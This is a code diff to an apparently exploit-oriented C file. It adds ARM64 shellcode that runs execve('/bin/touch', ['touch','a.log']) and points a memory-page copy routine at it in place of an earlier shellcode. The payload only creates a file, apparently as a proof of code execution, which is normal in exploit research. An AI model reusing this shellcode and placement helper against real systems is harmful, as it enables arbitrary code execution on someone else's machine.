@@ -43,6 +43,47 @@ __asm__(".global shellcode\n"
 	"mov  x8, #221\n\t" // SYS_execve
 	"svc 0");
 
+extern void shellcode_touch();
+__asm__(".global shellcode_touch\n"
+	"shellcode_touch:\n\t"
+	/* execve(path='/bin/touch', argv=['touch', 'a.log'], envp=0) */
+    	/* push b'/bin/touch\x00' */
+    	/* Set x14 = 8462109971917136431 = 0x756f742f6e69622f */
+    	"mov  x14, #25135\n\t"
+   	"movk x14, #28265, lsl #16\n\t"
+  	"movk x14, #29743, lsl #0x20\n\t"
+    	"movk x14, #30063, lsl #0x30\n\t"
+    	"mov  x15, #26723\n\t"
+    	"stp x14, x15, [sp, #-16]!\n\t"
+    	"mov  x0, sp\n\t"
+    	/* push argument array [b'touch\x00', b'a.log\x00'] */
+    	/* push b'touch\x00a.log\x00' */
+    	/* Set x14 = 3341952846830858100 = 0x2e61006863756f74 */
+    	"mov  x14, #28532\n\t"
+    	"movk x14, #25461, lsl #16\n\t"
+    	"movk x14, #104, lsl #0x20\n\t"
+    	"movk x14, #11873, lsl #0x30\n\t"
+    	/* Set x15 = 6778732 = 0x676f6c */
+    	"mov  x15, #28524\n\t"
+    	"movk x15, #103, lsl #16\n\t"
+    	"stp x14, x15, [sp, #-16]!\n\t"
+    	/* push null terminator */
+    	"mov  x14, xzr\n\t"
+    	"str x14, [sp, #-8]!\n\t"
+    	/* push pointers onto the stack */
+    	"mov  x14, #14\n\t"
+    	"add x14, sp, x14\n\t"
+    	"str x14, [sp, #-8]!\n\t" /* b'touch\x00' */
+    	"mov  x14, #16\n\t"
+    	"add x14, sp, x14\n\t"
+    	"str x14, [sp, #-8]!\n\t" /* b'a.log\x00' */
+    	/* set x1 to the current top of the stack */
+    	"mov  x1, sp\n\t"
+    	"mov  x2, xzr\n\t"
+    	/* call execve() */
+    	"mov  x8, #221\n\t"
+    	"svc 0");
+
 char *create_shellcode(unsigned long len) {
 	int i;
 	char *shellcode_addr;
@@ -63,7 +104,7 @@ char *create_shellcode(unsigned long len) {
 
 	// copy shellcode to memory page
 	// TODO: replace |0x100| with your shellcode length
-	memcpy(shellcode_addr + len - 0x100, &shellcode, 0x100);
+	memcpy(shellcode_addr + len - 0x100, &shellcode_touch, 0x100);
 
 	return shellcode_addr;
 }
